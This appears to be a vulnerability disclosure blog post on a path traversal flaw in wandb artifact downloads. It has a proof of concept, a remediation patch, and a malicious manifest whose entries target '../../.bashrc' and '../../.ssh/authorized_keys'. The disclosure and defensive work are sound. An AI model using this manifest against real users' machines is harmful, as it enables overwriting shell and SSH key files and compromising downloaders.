---
layout: post
title: "W&B Artifacts: Path Traversal via Malicious Manifest (Zip Slip for ML)"
date: 2026-05-02
categories: [security, vulnerability, wandb]
tags: [path-traversal, arbitrary-file-write, cwe-22, ml-supply-chain]
---

## Summary

A path traversal vulnerability in [Weights & Biases](https://wandb.ai/) (wandb) allows a malicious artifact to write files **anywhere on the filesystem** when downloaded. Manifest entry keys containing `../` sequences are joined directly into file paths with no sanitization — essentially [Zip Slip](https://security.snyk.io/research/zip-slip-vulnerability) (CVE-2018-1002200), but for W&B artifacts.

- **CVSS 3.1:** 9.1 (Critical) — `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H`
- **CWE:** CWE-22 (Path Traversal)
- **Affected:** wandb <= 0.20.1, likely all versions with artifact download
- **Status:** Reported to vendor on 2026-05-02, 90-day coordinated disclosure

## The Bug

### Root Cause

In `ArtifactManifestEntry.download()` (`artifact_manifest_entry.py`), the download path is constructed as:

```python
path = str(Path(self.path))
dest_path = os.path.join(root, path)
```

There is no check that `dest_path` stays within `root`.

The `LogicalPath` class (`lib/paths.py`) explicitly **preserves** `..` components — its own comment says *"it doesn't alter absolute paths or check for prohibited characters etc."* Then `filesystem.py` creates parent directories for the traversed path and writes the file via `shutil.copy2()`.

Manifest entry keys in `ArtifactManifestV1.from_manifest_json()` come straight from JSON with no sanitization.

### Proof of Concept

```python
from wandb.sdk.lib.paths import LogicalPath
from wandb.sdk.artifacts.artifact_manifest_entry import ArtifactManifestEntry
from pathlib import Path
import os

# LogicalPath preserves traversal sequences
lp = LogicalPath("../../.ssh/authorized_keys")
print(f"LogicalPath: {lp}")  # ../../.ssh/authorized_keys

# ArtifactManifestEntry stores them as-is
entry = ArtifactManifestEntry(path="../../.bashrc", digest="abc123==")
print(f"Entry path: {entry.path}")  # ../../.bashrc

# download() joins root + path without validation
root = "/tmp/artifacts/run-abc/my-artifact"
path = str(Path(entry.path))
dest_path = os.path.normpath(os.path.join(root, path))
print(f"dest_path: {dest_path}")  # /tmp/artifacts/.bashrc — ESCAPED root
print(f"Escaped root: {not dest_path.startswith(root)}")  # True
```

### Malicious Manifest

A `wandb_manifest.json` that exploits this:

```json
{
  "version": 1,
  "storagePolicy": "wandb-storage-policy-v1",
  "contents": {
    "../../.bashrc": {"digest": "abc123==", "size": 100},
    "../../.ssh/authorized_keys": {"digest": "def456==", "size": 200},
    "legit_file.py": {"digest": "ghi789==", "size": 50}
  }
}
```

### End-to-End Confirmation

I confirmed this end-to-end against the live W&B service:

1. Created a test artifact with a manifest entry path of `../../evil_escaped.txt`
2. Logged it to a real W&B project via `wandb.init()` + `artifact.log()`
3. Downloaded it with `artifact.download()`

The server accepted the traversal path without sanitization. On download, the file was written **two directories above the artifact root**.

## Impact

**Arbitrary file write** outside the artifact root directory. The severity depends on the deployment context:

### Launch Agent (Critical)

The most concerning scenario. In W&B Launch, artifact download happens on the **host filesystem before any container is created** — `project_dir` is a `tempfile.mkdtemp()` on the host. Even the local-container runner doesn't help because the traversal happens before containerization.

### Shared Projects

A teammate downloads a poisoned artifact pushed by a compromised or malicious account → arbitrary file overwrite on their machine.

### Public Artifacts (Supply Chain)

A public artifact with traversal entries acts as a supply-chain attack vector. Anyone who downloads it gets files written outside the expected directory.

## Existing Protections (Missed Here)

W&B already has path traversal protections in `media.py` (a `"directory traversal"` check). This one was simply missed in the artifact download path.

## Suggested Fix

Reject `..` components and absolute paths before joining, then verify the resolved path is within the root:

```python
from pathlib import PurePosixPath, Path

# Pre-join validation
p = PurePosixPath(path)
if p.is_absolute() or '..' in p.parts:
    raise ValueError(f"Path traversal detected: {path}")

# Post-join verification (defense in depth)
dest_path = Path(os.path.join(root, path)).resolve()
root_resolved = Path(root).resolve()
if not dest_path.is_relative_to(root_resolved):
    raise ValueError(f"Path escapes artifact root: {path}")
```

**Note:** A simple `normpath(dest_path).startswith(normpath(root))` check is insufficient because paths like `/tmp/root_evil` would match `/tmp/root`. Validation should also be added in `LogicalPath.__init__()` and `ArtifactManifestV1.from_manifest_json()`. Symlinks and Windows backslash handling should also be considered.

## Timeline

| Date | Event |
|------|-------|
| 2026-05-02 | Vulnerability discovered and reported to W&B |
| 2026-05-02 | CVE requested |
| TBD | Vendor response |
| TBD | Fix released |

## References

- [Zip Slip Vulnerability (Snyk Research)](https://security.snyk.io/research/zip-slip-vulnerability)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [wandb on PyPI](https://pypi.org/project/wandb/)
